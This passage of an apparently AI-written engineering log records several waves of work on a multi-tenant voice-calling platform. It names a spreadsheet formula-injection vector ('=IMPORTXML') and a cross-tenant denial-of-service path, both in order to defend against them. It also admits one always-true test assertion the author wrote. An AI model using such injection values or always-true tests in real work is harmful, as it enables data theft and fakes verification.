  fabrication was the yardstick. The model prompt was rewritten around five named rules
  (WHO SPOKE DECIDES WHAT IS A FACT · A DENIAL IS NOT A CONFIRMATION · ABSENT MEANS NULL ·
  WHOSE IS IT · VALUES EXACTLY), and `coerce_value` now rejects non-scalars, speaker
  labels, placeholder strings, and phone-shaped runs in non-phone fields.
- **One limitation was recorded rather than papered over.** A caller ringing to *ask*
  whether their booking was cancelled genuinely says the word "cancel", and no word-level
  rule separates asking from doing. That is a strict xfail against the heuristic, not a
  passing test with a hedged assertion — and strict means teaching it polarity promotes
  the test instead of leaving a quiet known gap.
- **The redactor corrupted the ids it was supposed to leave alone.** uuid_v7 is
  time-prefixed and therefore digit-dense, so the phone pattern ate call ids and hex
  digests out of log lines — the audit trail's join keys, destroyed by the control meant
  to protect the audit trail. Identifiers are now held aside before masking and restored
  after. A first fix missed hex digests; the test written for it caught that.
- **`add_to_dnc` had existed since the compliance gate shipped with no production
  caller.** There was no way to add a number to the do-not-call list. The write path,
  the check (POST, because the identifier IS the personal data), and the removal now
  exist — and `is_removable()` is the ONE definition of "may this be undone here",
  because the first version computed the UI flag from `scope` while the endpoint enforced
  on `source`, which would have rendered a button that 422s.
- **The dispatcher and the retention tick were O(all tenants)** — 44.9s → 5.8s and
  62.0s → 5.9s. At a hundred clients that is not slowness, it is a dispatch window that
  closes before the campaign starts.
- **Structural tests, not example tests, where the rule is the thing.**
  `impersonation_reads_test` asserts over the entire route table that no GET requires a
  MUTATING permission, with exemptions each required to name a live route.
  `money_semantics_test` pins `to_paise` returning RUPEES: the name is a lie, the top-up
  guard compares its result against `MIN_TOPUP_INR = 100.00`, and a well-meaning rename
  would turn a ₹100 floor into ₹1 with every rounding test still green.
- **The intake step landed** (§45's one addition rather than correction). FLOWS §1 names
  its eight fields explicitly, so exactly those eight were built and nothing invented. It
  writes `prompt_versions.compiled_t0_context` — the column D-39 reserved and no writer
  had ever filled — and keeps escalation phone numbers OUT of the compiled prompt, since
  a staff mobile in a system prompt is a number the agent can read out to whoever asks.

**Two mistakes of mine worth leaving in the record.** I diagnosed a failing audit test as
my own typed-proof change, re-ran the committed version, saw it pass, and called it
resolved — that was luck; the real cause was the redactor mangling a uuid. And I wrote
`assert result.get("intent") != "cancel" or True` — an assertion that is always true, the
precise anti-pattern this whole sweep was hunting.

**The credit-ledger index has now been refused four times over.** Three agents refused it
for progressively better reasons; two test fixtures that minted violations were fixed, and
a measurement afterwards still found ~11 fresh violating pairs in ten minutes. At least
one more minter exists. The refusal stands until it is named — an index that fires in
production is worse than the duplicates it would have caught.

## §46 — the waves that went after what nothing was watching

Suite: **1036 passed, 8 skipped, 3 xfailed** on a clean tree. Fourteen territories, each
committed only after its own verification was re-run independently of the agent's report.

**Four holes that no test could have caught, because nothing was looking.**

- **A guard hard rule 3 rested on did not exist.** `apps/voice-runtime/main.py` cited
  `import_surface_test.py` by name; there was no such file. `make guardrails` could not
  have covered it either — grimp walks `apps` as a package tree, and D-18's hyphenated
  `apps/voice-runtime` is not a legal module name, so `build_graph("apps")` returns 109
  modules and none of them are this service. The engine-isolation comment in
  `pyproject.toml` was intent with nothing behind it.
- **PostgreSQL runs foreign-key checks with row security BYPASSED.** So `submit_source`
  not checking that `agent_id` belonged to the caller was not covered by RLS: the row
  landed with tenant B's `tenant_id` and tenant A's `agent_id`, and the unique index —
  also evaluated over all rows — took a slot A could never use again. A's own submit then
  died on a UniqueViolation caused by a row A cannot see, list or delete. Cross-tenant
  denial of service plus an existence oracle. Publishing it was already refused, which is
  exactly what made it look harmless.
- **A call the engine never dated never aged out.** `calls.ended_at` is nullable and
  vendor-supplied; every predicate in the retention sweep compared it to a cutoff, and
  NULL compares to nothing. Such a call kept its recording, transcript and summary
  FOREVER — invisible to the probe, to all four statements, to the counters and to the
  tenant's own policy. A legal obligation switched off by a missing vendor field.
- **A staff reader could pull transcript text off the calls list.** The offline extractor
  returns the last transcript line verbatim, speaker prefix included, and that is what
  runs with no provider key. The pipeline stored it raw and the CRM surfaces returned it
  raw; `staff` holds `calls:read` and not `calls:read_raw`. A fourth exit nobody had
  named: `plan_callback` rendered the raw summary into the outbound agent's PROMPT, so it
  left to the engine and could be spoken back to the person being rung.

**The compliance gate stopped being asked once a campaign was `running`.** `check_dispatch`
is per-number and per-agent — it structurally cannot see the DLT template, the header
registration, the PE registration, the TM link, our own TM registration, or the list's
consent provenance. Six facts verified once at launch and never again, every one of them
withdrawable mid-campaign by a registrar or a TSP, with `resume` a bare CAS carrying no
gate at all. And a cancelled tick re-rang people it had already called: the claim shared a
transaction with the dial loop, and `except Exception` does not catch `CancelledError`.

**The credit-ledger index, settled at the fifth attempt — the key was wrong, not the
predicate.** `credit_ledger.ref` is two namespaces in one column: a `usage` row carries a
call id, a `topup` row carries whatever the bank printed, and `payment_ref` accepts any
3-120 character string. The system does not prevent that collision, it TOLERATES it, in
three places deliberately. `UNIQUE (tenant_id, ref)` would have turned a defended-against
collision into a 500 on a valid payment. The unnamed minter that stalled four attempts was
a test asserting exactly that tolerance: 11 violating pairs under the old key, zero under
`(tenant_id, reason, ref)`. The migration does not build on the shared dev database, on
purpose — it holds two duplicate groups stamped 2027 that hard rule 4 makes permanent, and
a cutoff chosen to dodge dev residue protects nothing.

**Two documents were telling people things that were not true.** The erasure certificate
promised the audio "is removed by the object-store lifecycle rule, floored at 90 days";
SEC-COMP §4 records that policy as a bucket-wide CEILING of 2555 days that cannot follow a
per-tenant rule, and no per-tenant mechanism deletes recording bytes at all. And
`consent_ledger.phone_e164` is NOT NULL and erasure never touches it, so the number itself
survives — while the notice read as "nothing about the person remains". Both widened; no
behaviour changed, because §4 forbids making the pointer-clear conditional on age until a
human decides.

**What was refused, and rightly.** The TTL divergence (docs 24 months, seed 365/1095/90) —
§4 names the founder as decider, so it got a tripwire asserting the divergence is still
DECLARED rather than a silent pick. The erasure/floor precedence — a legal question, so
the collisions are counted and warned, not resolved. 140/160 series enforcement — a
refusal to launch or dispatch, never a choice of outgoing header, because the engine
contract carries no from-number and the docs specify none. A Google adapter — no service
account exists, and an adapter written against an API nobody can call looks finished and
is not. A concurrent-submit collision in KB that could not be reproduced deterministically
— not fixed on the strength of a flaky test.

**One process lesson.** A repo-wide `ruff check --fix .` in an agent brief rewrote files
three other agents held open. Nothing was lost, but the briefs now scope it per-directory,
and `make db-reset` is prohibited outright while the dev database is shared.

## §47 — the M2 push: shipping the things the docs already promised

Suite went 1107 → 1296 on a clean tree, six guardrails green, 86 OpenAPI paths. This wave
worked from `docs/ROADMAP.md` §3 and `docs/SURFACES.md` §2b rather than from ideas — every
item below is something a doc already claimed and the code did not do.

**Google Sheets, the other half of D-23.** Delivered through the SAME job as the webhook
half, so it reuses the delivery id, the retry ladder and the exhaustion alert rather than
minting a second definition of "we delivered a lead". Three details decided it: column
order lives in a JSON array because JSONB does not preserve key order (Postgres sorts by
length then bytes, so a key-ordered mapping returns scrambled and every row lands under
different headings); an event with no declared order is REFUSED rather than guessed,
because a spreadsheet has no per-row schema to catch a shifted value; and `=IMPORTXML(…)`
in a caller-supplied lead name would exfiltrate the row, so input is pinned to RAW and the
OWASP leading characters get the apostrophe Sheets reads as "this is text".

**Two-speed publishing was not half-built, it was inverted.** `write_prompt_version`
re-published a live agent in the same transaction — every version was born live — while
`set_agent_voice` deliberately never touched the engine. Exactly backwards from §2b. And
the diagnosis is the useful part: FLOWS §7's "explicit publish" was about prompt
VERSIONING, not prompt PUBLISHING, and `insert_prompt_version` says so in its own
docstring. **The missing thing was never a button, it was a second pointer** —
`agents.system_prompt_id` was holding two answers that are allowed to differ. Pending is
now derived from the two, never stored as a flag that can disagree with them.

**Metering learned to say what it cannot know.** SURFACES §2b asks that a call which ran
on the cheaper voice be billed at the cheaper rate. The finding came before any code:
NOTHING in our system observes which TTS model served a call — no field on the snapshot,
no character count, and the rates differ exactly 2:1 so a leg cost cannot divide them
apart. Billing the premium rate was an assumption read off config, never a measurement.
So the honest fix was attribution, not a price: every usage row carries the tier AND its
source, premium requires evidence, and an unknown voice resolves to the VALUE tier because
the asymmetry must favour the client. `tts_tier_source` has no `engine_reported` member,
so the code cannot express a claim it has no evidence for.

**Caps got a client half, and the schema carries the argument.** A control the spender can
raise at will is not a control; a limit on their own money they cannot lower is not their
account. Two column pairs, effective cap = `LEAST(admin, client)`, derived and never
stored — so a client who lowers to ₹2,000 then clears their own cap lands back on the
admin's ceiling rather than on ₹2,000-forever or unlimited. A cap set below this month's
spend binds IMMEDIATELY: the person setting it is the one having the emergency, the gate
is outbound-only so they cannot take their own receptionist off the air, and a cap that
binds next month is not a mitigation.

**Escalation, and the consent it needs.** A campaign contact that exhausted its dial
ladder used to just stop. It now escalates — through `check_dispatch` itself rather than a
messaging-shaped copy of the rules — and the consent that gates it is its own ledger
purpose, because **consent to be CALLED is not consent to be MESSAGED**. Nothing is
backfilled; a migration granting one from the other would have been the worst thing in the
wave. The asymmetry lives in the schema rather than in guidance: a granted row must carry
evidence and must not come from `staff_recorded_request`, which stays available for
withdrawal, so `assumed` is unrepresentable rather than discouraged.

**Meta Lead Ads stopped being a sales claim.** §2b warned in its own text not to claim it.
Research changed the build twice: the payload carries NO answers (they need a Graph call
with a Page token this deployment does not hold, so there is a capability constant and no
fabricated client), and Meta retries ~36 hours then UNSUBSCRIBES the client's Page — so a
permanent refusal is acked 200 and recorded `failed`, because refusing loudly would
disconnect the client's own lead flow. `developers.facebook.com` is egress-blocked here,
so every vendor fact is marked docs-verified vs still owed a live confirmation.

**The brittle test was measuring a query nobody runs.** The balance-read assertion
EXPLAINed a tenant that does not exist (planner estimates one row; sorting one row is
free — that was the whole 8.17-vs-8.18 mystery) inside an untenanted session where RLS
collapses to `One-Time Filter: (NULL = …)`. It now builds a real ledger in a real tenant
session and asserts no Sort survives `enable_sort = off` — PG16 DISCOURAGES rather than
forbids, which is what makes it stable: 1e10 dwarfs a 0.01 cost tie. The tie was a real
signal too: `ix_credit_ledger_tenant_id` is a strict prefix of the composite.

**What was refused.** A retail value-tier rate (TRD §10.1's bands are explicitly
unmeasured, so a number would be invention wearing a citation — a test fails if anything
assigns one); a WhatsApp BSP; a Razorpay order-creation adapter; a Graph API client; a
per-vertical prompt dict nothing would read; and a fifth `retention_policies` category for
KB, which would have contradicted DATA-MODEL §9.

**The process lesson that cost the most.** Territories were drawn by DIRECTORY while the
coupling was by BEHAVIOUR, so seams kept landing on the orchestrator: a router nobody
mounted, a field named `summary` that tripped a guardrail another slice had just armed, a
migration that broke a third slice's test runs. The rule now is that an agent owns its
slice end-to-end — its migration, its router mount, its contract regeneration — and shared
state gets a protocol rather than a prohibition. Two seams still had to be caught by hand
and are worth knowing as a class: a worst-case cost quote that read one of two rates after
a second was added, and a GET requiring a MUTATING permission that only became visible
when two slices shared a route table.

## §48 — the wave that went after the declarations nothing gave effect to

1355 tests collected, 90 OpenAPI paths, seven guardrails in `make guardrails`. Where §46
hunted for things nothing was watching and §47 built the things the docs already promised,
this wave found the third shape: **columns, constraints and rules that had been written
down, migrated, and then given effect by nothing.** Four of the six items below were
already in the schema. What was missing was a reader.

**The half-wired-feature rule stopped being advice.** `scripts/check_wiring.py` now asks
four questions of the tree, and the important one is the router scan — not because an
unmounted router does nothing, but because **it is unaudited**. Every authorization sweep
this repo relies on enumerates the routes of the LIVE app (`assert_policy_registry_complete`
at boot, `impersonation_reads_test`, `authz_audit_test`, `check_redaction_exposure`), so a
router nothing mounts appears in none of them and can carry a D-22 violation, an undeclared
permission or a raw-PII response for as long as it stays unmounted — with every check
green, right up to the day somebody mounts it and the violation arrives with it.
`agents/publishing_routes.py` sat in exactly that state, complete and tested. It also
covers `apps/voice-runtime`, which import-linter structurally cannot see: grimp walks
package trees and D-18's hyphen is not a legal module name, so the whole service is
invisible to `lint-imports`. The off-the-shelf tools were evaluated and rejected on the
record rather than by taste — `vulture`/`deadcode` answer "is this symbol referenced",
which on FastAPI/SQLAlchemy/Pydantic is a false-positive machine whose own remedy is a
whitelist simulating usage; `ruff` sees one file at a time; `import-linter` cannot object
to a module imported by nothing. The departure is that this file never asks whether a
symbol is referenced. It asks whether a declaration appears in the **registry that gives it
effect**, which is also why it declines the shapes where no such registry exists (read-vs-
write, enum members). `UNWIRED_BASELINE` — the deliberate deferrals, keyed per column, each
naming what closes it — turned out to be the useful artefact: three of its entries were
deleted later in this same wave by the slices below, which is what a baseline is for. That
only works because of the fourth question, which is the one nobody would have thought to
write: the baseline is checked against itself, so an entry naming a column that has since
been wired, or a column that no longer exists, FAILS. A baseline that may only shrink is a
deferral list; one that may grow quietly is an exemption file, and every exemption file in
the industry ends the same way.

**Two columns had been migrated, documented and read by nobody, and it was a money bug in
both directions.** `plans.effective_from`/`effective_to` existed while every reader
resolved a plan as `ORDER BY created_at DESC LIMIT 1`. So a price change staged for next
month re-priced today's bill, the client's panel, the worst-case quote and the dispatch
ceiling the moment the row was inserted — and the deeper half, which took longer to see:
an invoice here is a DERIVED statement rather than a stored row, so re-rendering July
after any plan change re-priced July. **A statement that changes when you look at it twice
is not a statement.** Half-open `[from, to)` is taken verbatim from SQL:2011 because
closed-closed makes the changeover instant belong to both rows, so the day a plan is
superseded is priced by a coin flip. The non-overlap EXCLUDE constraint was declined on
evidence, not preference: every `plans` row that exists today is NULL/NULL and therefore
mutually overlapping, so it would refuse the table's own contents, and `apply_client_caps`
MINTS a windowless row for a tenant with no plan. Resolution is a total order instead —
and the property that made it shippable is that with every window NULL it collapses to the
newest-row rule, so it re-priced nobody on the day it landed. The cost is stated rather
than discovered: closing a window with no successor leaves a tenant UNPRICED, deliberately,
because falling back to the expired row would charge a client at terms whose end date we
were explicitly told. `warn_no_plan_in_effect` is what turns that from a quietly free month
into a log line. D-46.

**A halt could not say why it was thrown.** `platform_state.halt_reason` was a column
nobody wrote, sitting beside a runbook that told operators to read it. Worse, the comment
explaining its absence was wrong: it claimed the reason lived in `write_audit`'s summary —
and **`audit_log` has no summary column** (`compliance/audit.py` sends the sanitised
summary to the log stream keyed by entry id, because hashing a field the row does not carry
would make the chain unverifiable). So the first question an operator asks at 3am was
answerable only by someone who knew which log stream to grep. It is now required to halt, a
halt nobody explained being one nobody can safely lift; written in the SAME statement as
`outbound_halted`, so no read can catch a halt without its reason; **cleared on release**,
because a reason beside a running platform reads as current and sends the next reader after
last week's incident; and untouched by a load-shed-only change, so tightening shedding
mid-incident cannot erase why dialling stopped.

**One confirmation string covered three different decisions.** `set_platform_state`
authorised halting all outbound, releasing that halt, and every load-shed tweak — so a
header captured for the routine Tuesday change satisfied the largest switch on the
platform. It now names the transition, with the load-shed mode IN the string because
consent to `reduced` is not consent to `maintenance`. This is a **breaking change to an ops
surface and was not grandfathered**, because the old string's whole defect was authorising
more than the operator meant: keeping it "for compatibility" keeps the hole open under a
different name. The muscle-memory curl now 403s, so the refusal prints the header that
would have worked, and both callers moved in the same change. D-45. It is still a header
and still not a second factor — it stops the accidental and the drive-by until Clerk
re-auth lands, and it is here now because adding it later means changing the callers, which
is the bill this change just paid.

**KYC: the mitigation that had been described in three documents and built in none.**
SURFACES §2b, FLOWS §2 and BRD §245 all spoke of number purchase gated behind KYC; nothing
in the schema modelled it. Research decided the shape before a column was written — DoT's
business connections (Aug 2023, expanded May 2024), the June 2025 circular extending the
same protocols to internet telephony, Telecom Act 2023 s.3(7), and the fact that **Exotel,
our own D-05 pick, blocks outgoing calls until KYC clears** — so a product that let a
client "buy" a number without a record would be writing a cheque the TSP will bounce. The
part worth remembering is that this is **two questions, not one**, and answering them the
same way fails either way round: a tier-blind DIAL gate halts every existing client over a
data-entry backlog without closing a risk (this repo has already paid that once, with
`tm_registration_missing`), while a tier-BLIND provisioning gate is the only version that
holds, because the obligation attaches to the connection and `plan_tier` is admin-settable —
a legal control keyed on it is one support ticket from being switched off. No identity
document is stored anywhere: entity registries only, an evidence *reference* rather than a
pack, and a CHECK that refuses a bare 12-digit `document_ref` so an Aadhaar pasted into a
business field is unstorable rather than discouraged. What research did NOT settle — whether
a non-licensee reseller must itself hold the CAF — is recorded as unsettled and not
modelled. D-47.

**The credit-ledger index story finally closed, at both ends.** The unique index landed
earlier on the corrected key (`tenant_id, reason, ref` — four refusals had argued about the
predicate while the KEY was the wrong shape); this wave removed the other one.
`ix_credit_ledger_tenant_id` was a strict prefix of the composite, and step two of a
two-step deprecation is not a formality, so every query in the repo that touches
`credit_ledger` was EXPLAIN ANALYZEd on a loaded database before and after: no node type
changed and nothing fell back to a sequential scan. It costs two more shared buffers per
bitmap scan and buys an append-only table one insert-time index instead of two. The model's
`index=True` came out in the same change — leaving it would have had the next autogenerate
helpfully recreate the index, a deprecation that un-deprecates itself.

**Ops got the button that closes a dead end nobody could exit.** `spend_state.capped` is
derived, and raising a ceiling does not by itself release it: the gate reads the flag, a
capped tenant meters nothing so the meter can never clear it, and the client's own
`PUT /v1/billing/caps` needs `org:manage`, which is mutating and therefore refused to an
impersonating admin under D-22. An outbound-only client whose ceiling ops had just raised
stayed stopped until they acted themselves or the IST month rolled over. The recompute
route **re-derives and never writes the flag** — an ops button setting `capped = false`
would be a third DEFINITION rather than a third caller, and its first incident would be a
tenant dialling past a ceiling with the meter re-arming behind them. It reports the counters
and the effective ceiling beside the flag, which turns "it did not work" into "the ceiling
is 2 and they have used 3".

**The screens, including the one that makes a refusal fixable.** The client half of
two-speed publishing (an unsaved-changes banner DERIVED from the two pointers, never stored
as a flag that can disagree with them; Apply and Undo deliberately absent from the client
realm because the staged script is authored admin-realm), the cap editor on `/usage`, the
Meta Lead Ads setup card on `/lead-sources`, and `/messaging-consent` — which is the screen
that turns `recipient_not_opted_in` from a dead end into something a human can resolve by
recording that somebody said yes. The ops console's release button moved to the new
confirmation header in the same commit that broke the old one.

**What was refused, and why it stays refused.** The `EXCLUDE` non-overlap constraint (it
would refuse the table's existing rows). Proration across a plan change (there is no answer
to "how many of the 500 included minutes belong to each half" that a client would recognise
as theirs; the industry answer is the same one — plan changes take effect at a billing
boundary). Falling back to an expired plan row. Widening the dial-time KYC gate to every
tier. Modelling a CAF, a form workflow or a document store on unsettled law. And, still:
the retail value-tier rate, a WhatsApp BSP, Razorpay order creation, a Meta Graph client,
and a Google Sheets service account — five holes that are each one credential or one
founder decision wide, and every one of them named by a greppable constant rather than
faked.

**The lesson this wave adds.** Three of the four defects above were invisible to tests
because the code did exactly what it said — a plan resolver that returns the newest row is
not broken, it is answering a different question from the one the schema asks. The thing
that finds this class is not another test; it is asking, of each declaration, **which
reader gives it effect** — which is precisely what `check_wiring.py` was built to ask, and
why it closed three of its own baseline entries within the same wave.

## §49 — the wave that went after the promises made to nobody in particular

1398 tests collected, 92 OpenAPI paths, seven guardrails, 30 routers all mounted and one
migration head. Four slices, and their common shape is narrower than §48's: **each one is
a promise the documents made on the platform's behalf, to an operator or a regulator or a
client, that no mechanism was keeping.** An RPO in a runbook. An alert "to Sri's phone". A
manual review before a stranger's first campaign dials. None of them had a reader either,
but unlike §48's columns, the person they were promised to is outside the repo.

**The catalog question turned on DEDUPLICATION, and the hypothesis that scoped it out was
wrong.** `e7c3d10a9f52` dropped one prefix index and deferred twelve tables on the theory
that "most are covered by UNIQUE indexes, which is a different call". Uniqueness turned out
to decide nothing, on three counts checked before it was abandoned: PG16 §11.3's
leading-column rule carries no uniqueness condition; `btcostestimate`'s unique shortcut
requires an equality qual on *every* key column, so a prefix-only qual never fires it and
the estimate comes from the same `pg_statistic` path a plain cover gets; and nothing can
depend on a non-unique `ix_*` — `ON CONFLICT` infers arbiters only from unique indexes, an
FK needs an index only on the referenced side, and `relreplident` is `d` everywhere. What
actually separates a droppable prefix from a load-bearing one is **btree deduplication**: a
non-unique index on a repeating column collapses duplicates into one posting-list tuple per
distinct value, and a cover whose trailing columns make every entry distinct cannot.
Measured, `ix_leads_tenant_id` is 1288 kB against its cover's 23 MB for the same 200k rows
— so offering only the fat cover for `tenant_id = …` does not move the query onto it, it
moves the query off indexes altogether. That is why the four big `ix_*_tenant_id` indexes
STAY, and they are exactly the ones every `tenant_isolation` qual runs through. Four of the
eleven go, seven stay with the plan that broke recorded beside each. Two of the keepers only
failed AT SCALE — `ix_kb_sources_agent_id` looked droppable at seed size and at 840 sources
per agent the planner abandons the agent path entirely — so the verdicts were re-taken at
raised rows-per-key rather than trusted, and the boundary is stated as a measured band
(somewhere between 400 and 4000 rows per key for these shapes) rather than derived into a
rule. The keeper that disproves the original hypothesis outright is
`ix_deletion_requests_tenant_id`, whose cover is not unique. And the agent threw away its
own first write-cost harness: 20k client round-trips reported the index making inserts 2%
FASTER, which was network latency rather than Postgres.

**Alerts had a vocabulary, a normalized failure stage and no recipient.** Every alarm the
last three waves added — the post-call stall, the outbox exhaustion, the unkeyable engine
payload, the bad payment signature — resolved to an ERROR log line, in a deployment with no
log search and one operator. OPERATIONS §8 gates launch on "alerts firing to Sri's phone",
so this was a pre-launch gate that had been quietly failing for as long as it had existed.
The interesting constraints were all about what alerting must NOT do. It runs from
voice-runtime's 500ms ack path, from the global exception handler and from a SIGTERM
handler, so inline it does one log record, one dict lookup under a NON-BLOCKING lock and one
`put_nowait` on a bounded queue — the lock is non-blocking specifically because the signal
handler runs on the main thread, which may already hold it, and deadlocking a drain to get
one extra deduplication is the wrong trade. It touches neither the outbox nor Redis,
because the alarms that matter most are the ones saying those are broken: an alert routed
through the broken component is an alert nobody gets. The log line is written FIRST and
unconditionally, so a process dying with sends queued loses the SENDS and never the record.
Storm handling was taken from the established shape rather than invented — per-fingerprint
repeat suppression keyed on `stage:code`, which is Alertmanager's `repeat_interval` and
PagerDuty's caller-supplied `dedup_key`, and is why every call site carries a stable code
rather than a formatted string, plus a global token bucket because 500 distinct codes are
500 distinct fingerprints. Fifteen minutes and no batching, against Alertmanager's own 4h
default, because there is one operator and no incident console, so first-signal latency
beats grouping. What the bucket drops is counted and reported in the next delivered body,
and a FAILED delivery clears the dedupe stamp — the window means "a human was told", so a
transport blip must not buy fifteen minutes of silence.

**And the observability config that looked wired was deleted rather than left to reassure
people.** `LANGFUSE_PUBLIC_KEY`, `LANGFUSE_SECRET_KEY` and `POSTHOG_KEY` were settings with
no client, which makes them worse than absent: absent prompts a question, present tells the
next reader traces are being recorded. They were **no-ops even WITH credentials**, so
"config-gated" was never the explanation. Restoring Langfuse needs a project nobody holds
and a decision-log entry choosing a second tracing pipeline beside the OTel one already
shipped; PostHog is browser analytics that never belonged in a backend `Settings` at all.
The exact restore steps sit in the config module beside `SENTRY_DSN`, and a test pins that
the keys stay gone. `redact_trace_payload` is KEPT — it is the pre-agreed hook shape hard
rule 6 names — with a docstring that now says plainly that nothing calls it, so per-call
token cost and the latency breakdown remain a gap and read as one.

**The 15-minute RPO in the runbooks was fiction, and the line that makes it true is one
timeout.** D-26 chose host-PostgreSQL over managed and closed by ACCEPTING a consequence:
nightly dumps alone break OPERATIONS §5's RPO, so continuous WAL archiving is REQUIRED, plus
an offsite dump and quarterly drills. None of it existed; DEPLOYMENT §9 already assumed
wal-g was there. The subtle part is `archive_timeout = 300`: without it a partial 16MB
segment is never shipped, so on a quiet SMB night "continuous archiving" ships NOTHING
between 23:00 and 07:00 — the design fails silently exactly when the promise is being made.
Failure visibility is four checks because one is not enough: PostgreSQL does not record an
archiver killed by a signal or exiting above 125 in `pg_stat_archiver`, and `command not
found` is 127, so deleting the wal-g binary leaves the obvious check green. The watchdog
therefore also checks archive freshness locally, runs `wal-verify` against the BUCKET (the
only check that catches "returned 0, the object is not there"), and watches `pg_wal` growth,
which is the precursor to the cluster refusing writes. Each covers the previous one's blind
spot, and the drill induces the exact failure `pg_stat_archiver` cannot see. **A restore
un-erases people**, so that is a mandatory step in the runbook rather than a footnote:
anyone whose DPDP erasure completed after the recovery target comes back holding a
certificate that says otherwise, and the authoritative list has to come from the PRESERVED
pre-restore cluster because requests raised after the target do not exist in the restored
one — which is why the procedure forbids deleting the broken PGDATA. Both chains retain 35
days precisely because that bound IS the erasure SLA for backups. Nothing here is applied:
CLAUDE.md forbids touching `infra/` prod without plan output, every secret is a
`<<SECRET:…>>` reference, no wal-g command was ever run, and the restore runbook carries an
UNVALIDATED banner instructing its first user to remove it.

One seam the two slices did not close between them, and it is worth naming because it
looks closed: the backup chain runs on the host as `postgres`, outside every Python
process, so it cannot call the `alert()` that gained a sink earlier in the same wave. It
emits the identical shape — `failure_stage=HOST_BACKUP`, a stable code — to journald and
to a `BACKUP_ALERT_COMMAND` hook that, as this wave left it, nothing configured, because no
endpoint or token belongs in this repository. **So the one alarm that says the database is
unrecoverable was, for the length of this wave, the one alarm that did not page** — closed
in §50, which made the hook default to the relay beside it rather than leaving the wiring
to whoever applies the tree. The largest unverified vendor
assumption is named rather than smoothed: wal-g against R2 has open multipart rejection
issues across several clients and wal-g #1639 records `backup-push` hanging after an S3 409,
so the first hand-run push is a watched test and the honest fallback is that chain A moves
providers.

**The first-campaign hold: "first" is a property of the ACCOUNT, and every other reading
loses.** D-34, FLOWS §2 and BRD all state that a self-serve account's first campaign is held
for manual review; `tenancy/signup.py` named the requirement in prose and nothing held
anything. The obvious shape — `campaigns.review_required` on the first row — is defeated two
ways in a minute, and neither is an attack: launch a SECOND campaign and it dials unreviewed,
or DELETE the flagged one and a DELETE decides what "first" means. Account scope removes
both, and the campaign an operator actually read is kept as EVIDENCE
(`reviewed_campaign_id`, `ON DELETE SET NULL`) rather than as the thing the hold hangs on.
**Absence means held** — no `pending` row and no request path, because a stored `pending` is
a second representation of one fact that can disagree with the absence, and the read fails
CLOSED to held on an unscoped session, the same shape `kyc.NOT_RECORDED` uses. Enforced in
BOTH `launch_blockers` and `dispatch_blockers`, so a withdrawn release stops a RUNNING
campaign at the next tick; released once, no later campaign is refused on this rule, because
the requirement is review of the FIRST campaign and not a signature forever. Deliberately
NOT in `check_dispatch`: that path is also the D-21 single-lead button and the instant
callback, and neither is a campaign. The migration grandfathers self-serve tenants that had
already launched, stamped `decision_source = 'migration_backfill'` so a NULL decider is
self-describing rather than an anonymous release. With it, **all six R-11 mitigations are in
code**, which retires the build-side objection to `self_serve_signup_enabled` — the switch
is now a business decision rather than a blocked one.

**What was refused or left honestly open.** A WhatsApp/SMS alert sink, because that is a BSP
decision and the email transport already existed — one mechanism for hot-lead notifications
and operator alerts, so there is not a second thing to configure and a second thing to be
broken on the night it is needed. Faking Langfuse with a stub client. An `EXCLUDE`
constraint, still. Widening the first-campaign hold to `check_dispatch`, where it would
block a lead who just raised their hand. Applying any of the backup mechanism, or claiming
an RPO the drill has not measured. And three decision entries the backup work raised were
deliberately NOT written in its own commit — the 35-day retention as a DPDP commitment, an
external dead-man heartbeat (today an extended VPS outage is detected by a human noticing),
and whether `ERASURE_LIMITATIONS` gains a backup clause; the first is now D-50, and the
other two are open because one is a dependency choice and one is a legal question.

**What this wave adds to the method.** §48 said the way to find a dead declaration is to ask
which reader gives it effect. This wave is the same question aimed outward: for every
promise a document makes to somebody who is not in this repo — an RPO, an alert, a review, a
retention window — ask **who would notice if it were false, and when**. Every one of the
four above answered "nobody, until the day it mattered", which is the definition of the
class. The alerting slice is the sharpest illustration: the alarms existed, the vocabulary
existed, the tests passed, and the delivery of all of it was a log line.

## §50 — the wave that gave the controls an operator, and the frontend a control of its own

1435 backend tests collected and — for the first time in this log — **40 frontend tests**
beside them, 93 OpenAPI paths, seven guardrails, 31 routers all mounted, one migration
head, ten deferred columns in `UNWIRED_BASELINE`. §49 wrote up four slices as they landed;
this entry covers what arrived after it was drafted, and those share a shape narrower than
either of the last two waves: **a control no human can see is not yet a control, and a
guarantee no machine can check is not yet a guarantee.** The hold queue,
the screens beside it, the backup alarm's default recipient and the frontend suite are
all one question asked four ways.

**The hold queue was built without widening a single RLS policy, and the reason is that a
policy is table-scoped.** Two R-11 mitigations — subscriber KYC and the first-campaign
review — refuse a tenant until a person at Calevate acts, and both shipped with no way for
that person to find out. The only way an operator would learn an account was held was the
client emailing to ask why nothing worked, which makes a mitigation depend on the client
complaining: that is a support queue, not a control, and it is worst for exactly the
accounts that never complain and quietly churn. The obvious build is one cross-tenant
SELECT behind a widened `app.admin` policy on `kyc_records` and
`first_campaign_reviews`, the way `organizations` was widened. It was refused on a
property of the mechanism rather than on taste: **a policy grants a TABLE, not a
column**, so widening `kyc_records` to answer "is anyone waiting" hands every future query
on every admin session the signatory's name, the document reference and the rejection
prose — permanently, to answer a question that needs none of
them. It also forces the "is this tenant held" condition to be re-expressed in SQL beside
the Python one the gates already ask, and two spellings of one compliance condition is the
drift both modules exist to prevent. What shipped instead is the mechanism `tenant_overview`
has always used: enumerate tenants under the admin session, then ENTER each tenant with its
own GUC and ask the ordinary gate. Nothing widened, no policy touched, and the answer comes
from the same predicate that refuses the client's dial — so the queue cannot tell an
operator an account is clear while the client is staring at a refusal. The cost is N+1 by
construction and is stated rather than discovered: bounded by a tier pre-filter drawn with
the gates' own `SELF_SERVE_TIERS` constant (a pre-filter, never a second copy of the rule —
the blocker still decides), payable at a few dozen self-serve accounts, and answered by a
materialized queue only if the list ever gets long enough to notice.

Three smaller decisions on that surface are worth keeping. **Hard rule 6 shaped the ROW,
not just the logging**: the queue carries the account, its motion, its signup instant and
the rule names, and deliberately drops the `reason` half of each blocker — because the
rejection reason interpolates an operator's free text, and free text belongs nowhere near
the widest-read list in the console. Everything identifying stays one click away behind the
permission that opens the account. **`org:read`, not `admin:tenants`**: D-22 forbids gating
a GET on a permission read-only impersonation refuses, and reading a work list is not acting
on it — every decision taken from it is a separate audited POST that keeps the mutating
permission. The realm, not the permission, is what keeps a client token out. And **no audit
row per read**: this is the page an operator refreshes, and an audit chain that grows a row
per poll stops being readable, which is the same argument the client's own KYC screen makes.

**The screens are where the two frontend contracts turn out to point in opposite
